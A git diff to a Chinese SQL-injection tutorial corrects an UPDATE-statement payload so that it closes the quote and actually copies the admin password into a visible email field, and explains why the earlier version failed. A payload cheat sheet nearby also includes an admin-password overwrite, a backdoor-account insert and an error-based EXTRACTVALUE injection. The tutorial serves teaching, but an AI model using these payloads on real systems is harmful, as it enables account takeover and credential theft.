@@ -1071,20 +1071,35 @@ $sql = "UPDATE users SET email = '$email' WHERE id = $user_id";
 
 ##### 1. 通过 SET 子句窃取数据
 
-攻击者可以将自己的某个字段值修改为其他用户的敏感数据（前提是子查询只返回一行一列）：
+攻击者可以将自己的某个字段值修改为其他用户的敏感数据。**关键**：必须先用 `'` 闭合原有的字符串上下文，让子查询出现在引号**外部**，否则子查询会被当成普通字符串而不会执行。
 
 ```sql
 -- 场景：修改自己的邮箱
 -- 在 email 输入框中注入：
-(SELECT password FROM users WHERE username='admin') WHERE id=1234 -- 
+test', email=(SELECT password FROM users WHERE username='admin') WHERE id=1234 -- 
 
 -- 实际执行：
-UPDATE users SET email = '(SELECT password FROM users WHERE username='admin') WHERE id=1234 -- ' WHERE id=456
+UPDATE users SET email = 'test', email=(SELECT password FROM users WHERE username='admin') WHERE id=1234 -- ' WHERE id=456
 ```
+
+**为什么之前那种写法不行？** 如果直接输入 `(SELECT ...)` 而不先闭合前面的单引号，拼接后变成：
+
+```sql
+UPDATE users SET email = '(SELECT password FROM users WHERE username='admin') ...'
+```
+
+此时子查询被包裹在一对单引号内部，数据库把它当纯粹的字符串字面量存储，**不会执行**。
+
+而正确写法 `test', email=(SELECT ...) WHERE ...` 中：
+1. `test'` 闭合了原有的左引号 `'`，并与 `email = 'test'` 的右引号配对
+2. 接着的 `, email=(SELECT ...)` 在引号**外部**，是一个真正会被执行的 SQL 子查询
+3. 最后的 `-- ` 注释掉原始 WHERE 条件，确保注入的子句生效
 
 这样，用户 ID 1234 的 email 字段就被修改为 admin 的密码。如果 email 字段在个人资料页可见，攻击者就获取了 admin 的密码 hash。
 
-> ⚠️ **注意**：MySQL 的 UPDATE SET 子查询默认不能引用正在更新的同一张表。需要绕过时可考虑使用派生表。
+> ⚠️ **注意**：
+> - MySQL 的 UPDATE SET 子查询默认不能引用正在更新的同一张表。需要绕过时可考虑使用派生表。
+> - 任何注入 payload 中，**子查询/函数调用必须出现在引号外部才会被数据库执行**，这是 SQL 注入中最基本的闭合原则。
 
 ##### 2. 修改其他用户的数据（核心威胁）
 
@@ -1407,8 +1422,8 @@ normal'), ('backdoor', 'backdoor_hash
 -- ===== UPDATE 注入 =====
 -- 修改他人密码
 hacked' WHERE username='admin' -- 
--- 窃取数据到可见字段
-(SELECT password FROM users WHERE username='admin') WHERE id=1234 -- 
+-- 窃取数据到可见字段（关键：先闭合引号，让子查询在引号外部）
+test', email=(SELECT password FROM users WHERE username='admin') WHERE id=1234 -- 
 -- 报错注入
 test' AND EXTRACTVALUE(1, CONCAT(0x7e, (查询))) AND '1'='1
 
